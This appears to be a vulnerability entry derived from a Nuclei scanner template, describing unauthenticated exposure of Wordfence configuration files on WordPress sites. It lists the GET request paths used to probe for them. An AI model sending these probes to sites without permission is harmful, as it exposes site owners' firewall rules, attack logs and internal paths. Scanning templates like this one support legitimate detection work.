# Vulnerability: WordPress Wordfence - Configuration File Disclosure
**Classification:** CWE-200
**Source:** Nuclei Template (`wordfence-config-disclosure.yaml`)

## Description
The Wordfence Security plugin for WordPress stores configuration files in the /wp-content/wflogs/ directory. These files may be accessible without authentication and can expose sensitive configuration data, firewall rules, attack logs, and internal paths.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/wp-content/wflogs/config.php
GET {{BaseURL}}/wp-content/wflogs/config-synced.php
```

